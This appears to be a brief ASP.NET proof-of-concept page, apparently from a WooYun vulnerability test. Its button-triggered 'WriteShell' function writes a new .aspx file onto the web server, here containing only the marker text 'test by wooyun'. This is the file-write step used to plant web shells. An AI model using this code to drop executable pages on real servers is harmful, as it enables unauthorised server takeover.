<script runat="server">

public void WriteShell(object sender,EventArgs e)

{

    System.IO.File.WriteAllText(HttpContext.Current.Request.PhysicalPath+".aspx","test by wooyun");

}

</script>

<form runat="server">

<asp:Button ID="Write" runat="server" Text="Write" OnClick="WriteShell"/>

</form>
